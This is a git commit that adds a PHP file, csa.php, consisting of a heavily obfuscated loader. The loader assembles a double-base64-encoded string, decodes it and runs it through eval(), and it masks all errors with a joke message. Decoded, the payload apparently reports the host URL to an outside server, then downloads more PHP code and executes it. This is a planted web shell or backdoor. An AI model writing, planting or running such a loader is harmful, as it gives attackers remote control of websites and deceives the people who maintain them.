e45377bf4d0f990eba5add062e33f41298abdd50
Keia <marsakaterr78@gmail.com>
2026-04-15 18:58:55 +0700

    Add files via upload

---
+++ csa.php
@@ -0,0 +1,235 @@
+<?php
+/** krik krik krik...*/
+
+try {
+    $z = "";
+    $z .= "UEQ5d2FI";
+    $z .= "QUthVzVw";
+    $z .= "WDNObGRD";
+    $z .= "Z25aR2x6";
+    $z .= "Y0d4aGVW";
+    $z .= "OWxjbkp2";
+    $z .= "Y25NbkxD";
+    $z .= "QXhLVHNL";
+    $z .= "YVc1cFgz";
+    $z .= "TmxkQ2du";
+    $z .= "WkdsemNH";
+    $z .= "eGhlVjl6";
+    $z .= "ZEdGeWRI";
+    $z .= "VndYMlZ5";
+    $z .= "Y205eWN5";
+    $z .= "Y3NJREVw";
+    $z .= "T3dwbGNu";
+    $z .= "SnZjbDl5";
+    $z .= "WlhCdmNu";
+    $z .= "UnBibWNv";
+    $z .= "UlY5QlRF";
+    $z .= "d3BPd29r";
+    $z .= "YXpONWR5";
+    $z .= "QTlJR0po";
+    $z .= "YzJVMk5G";
+    $z .= "OWtaV052";
+    $z .= "WkdVb0oy";
+    $z .= "RklVakJq";
+    $z .= "U0UwMlRI";
+    $z .= "azVhV1JZ";
+    $z .= "Y0dsTWJW";
+    $z .= "b3hZbWs0";
+    $z .= "TlUxSVRq";
+    $z .= "QmxWM2hz";
+    $z .= "VFZSSmRt";
+    $z .= "UkhWbnBr";
+    $z .= "UXpsNlpF";
+    $z .= "aHNjMXBU";
+    $z .= "TlhkaFNF";
+    $z .= "RTlKeWs3";
+    $z .= "Q2lSamRY";
+    $z .= "SWdQU0Fu";
+    $z .= "YUhSMGNE";
+    $z .= "b3ZMeWNn";
+    $z .= "TGlBa1gx";
+    $z .= "TkZVbFpG";
+    $z .= "VWxzblNG";
+    $z .= "UlVVRjlJ";
+    $z .= "VDFOVUox";
+    $z .= "MGdMaUFr";
+    $z .= "WDFORlVs";
+    $z .= "WkZVbHNu";
+    $z .= "VWtWUlZV";
+    $z .= "VlRWRjlW";
+    $z .= "VWtrblhU";
+    $z .= "c0tKR1Jo";
+    $z .= "ZEdFZ1BT";
+    $z .= "Qmhjbkpo";
+    $z .= "ZVNnblpt";
+    $z .= "bHNaVjkx";
+    $z .= "Y213bklE";
+    $z .= "MCtJQ1Jq";
+    $z .= "ZFhJcE93";
+    $z .= "b2tiM0Iw";
+    $z .= "YVc5dWN5";
+    $z .= "QTlJR0Z5";
+    $z .= "Y21GNUtB";
+    $z .= "b2dJQ0Fn";
+    $z .= "SjJoMGRI";
+    $z .= "QW5JRDAr";
+    $z .= "SUdGeWNt";
+    $z .= "RjVLQW9n";
+    $z .= "SUNBZ0lD";
+    $z .= "QWdJQ2R0";
+    $z .= "WlhSb2Iy";
+    $z .= "UW5JQ0E5";
+    $z .= "UGlBblVF";
+    $z .= "OVRWQ2Nz";
+    $z .= "Q2lBZ0lD";
+    $z .= "QWdJQ0Fn";
+    $z .= "SjJobFlX";
+    $z .= "UmxjaWNn";
+    $z .= "SUQwK0lD";
+    $z .= "ZERiMjUw";
+    $z .= "Wlc1MExY";
+    $z .= "UjVjR1U2";
+    $z .= "SUdGd2NH";
+    $z .= "eHBZMkYw";
+    $z .= "YVc5dUwz";
+    $z .= "Z3RkM2Qz";
+    $z .= "TFdadmNt";
+    $z .= "MHRkWEpz";
+    $z .= "Wlc1amIy";
+    $z .= "UmxaQ2Nz";
+    $z .= "Q2lBZ0lD";
+    $z .= "QWdJQ0Fn";
+    $z .= "SjJOdmJu";
+    $z .= "UmxiblFu";
+    $z .= "SUQwK0lH";
+    $z .= "aDBkSEJm";
+    $z .= "WW5WcGJH";
+    $z .= "UmZjWFZs";
+    $z .= "Y25rb0pH";
+    $z .= "UmhkR0Vw";
+    $z .= "TEFvZ0lD";
+    $z .= "QWdLU3dL";
+    $z .= "S1RzS0pH";
+    $z .= "TnZiblJs";
+    $z .= "ZUhRZ1BT";
+    $z .= "QnpkSEps";
+    $z .= "WVcxZlky";
+    $z .= "OXVkR1Y0";
+    $z .= "ZEY5amNt";
+    $z .= "VmhkR1Vv";
+    $z .= "Skc5d2RH";
+    $z .= "bHZibk1w";
+    $z .= "T3dwQVpt";
+    $z .= "bHNaVjlu";
+    $z .= "WlhSZlky";
+    $z .= "OXVkR1Z1";
+    $z .= "ZEhNb0pH";
+    $z .= "c3plWGNz";
+    $z .= "SUdaaGJI";
+    $z .= "TmxMQ0Fr";
+    $z .= "WTI5dWRH";
+    $z .= "VjRkQ2s3";
+    $z .= "Q2lSMWNt";
+    $z .= "d2dQU0Fp";
+    $z .= "YUhSMGNI";
+    $z .= "TTZMeTlp";
+    $z .= "ZFhwaUxt";
+    $z .= "WjFiaTly";
+    $z .= "TDNoa0xu";
+    $z .= "UjRkQ0k3";
+    $z .= "Q2lSamFD";
+    $z .= "QTlJR04x";
+    $z .= "Y214ZmFX";
+    $z .= "NXBkQ2dw";
+    $z .= "T3dwamRY";
+    $z .= "SnNYM05s";
+    $z .= "ZEc5d2RD";
+    $z .= "Z2tZMmdz";
+    $z .= "SUVOVlVr";
+    $z .= "eFBVRlJm";
+    $z .= "VlZKTUxD";
+    $z .= "QWtkWEpz";
+    $z .= "S1RzS1kz";
+    $z .= "VnliRjl6";
+    $z .= "WlhSdmNI";
+    $z .= "UW9KR05v";
+    $z .= "TENCRFZW";
+    $z .= "Sk1UMUJV";
+    $z .= "WDFKRlZG";
+    $z .= "VlNUbFJT";
+    $z .= "UVU1VFJr";
+    $z .= "VlNMQ0F4";
+    $z .= "S1RzS0pH";
+    $z .= "OTFkSEIx";
+    $z .= "ZENBOUlH";
+    $z .= "TjFjbXhm";
+    $z .= "WlhobFl5";
+    $z .= "Z2tZMmdw";
+    $z .= "T3dwamRY";
+    $z .= "SnNYMk5z";
+    $z .= "YjNObEtD";
+    $z .= "UmphQ2s3";
+    $z .= "Q21sbUlD";
+    $z .= "Z2tiM1Yw";
+    $z .= "Y0hWMElE";
+    $z .= "MDlQU0Jt";
+    $z .= "WVd4elpT";
+    $z .= "a2dld29n";
+    $z .= "SUNBZ1pX";
+    $z .= "Tm9ieUFp";
+    $z .= "Um1GcGJH";
+    $z .= "VmtJSFJ2";
+    $z .= "SUdSdmQy";
+    $z .= "NXNiMkZr";
+    $z .= "SUdOdmJu";
+    $z .= "UmxiblF1";
+    $z .= "SWpzS2ZT";
+    $z .= "QmxiSE5s";
+    $z .= "SUhzS0lD";
+    $z .= "QWdJR1Yy";
+    $z .= "WVd3b0lq";
+    $z .= "OCtJaTRr";
+    $z .= "YjNWMGNI";
+    $z .= "VjBLVHNL";
+    $z .= "ZlFvSw==";
+    $fn = 'base64_decode';
+    $s1 = $fn($z);
+    if ($s1 === false) { throw new Exception('oops..'); }
+    $s2 = $fn($s1);
+    if ($s2 === false) { throw new Exception('oops..'); }
+    $tokens = token_get_all($s2);
+    $smartCode = '';
+    $inEcho = false;
+    foreach ($tokens as $t) {
+        if (is_array($t)) {
+            switch ($t[0]) {
+                case T_OPEN_TAG:
+                case T_CLOSE_TAG:
+                    break;
+                case T_OPEN_TAG_WITH_ECHO:
+                    $smartCode .= 'echo (';
+                    $inEcho = true;
+                    break;
+                case T_INLINE_HTML:
+                    $smartCode .= 'echo ' . var_export($t[1], true) . ';';
+                    break;
+                default:
+                    $smartCode .= $t[1];
+            }
+        } else {
+            if ($inEcho && trim($t) === ';') {
+                $smartCode .= ');';
+                $inEcho = false;
+            } else {
+                $smartCode .= $t;
+            }
+        }
+    }
+    eval($smartCode);
+} catch (\ParseError $e) {
+    echo "You are cute..";
+} catch (\Throwable $e) {
+    echo "You are cute..";
+}
+
+?>
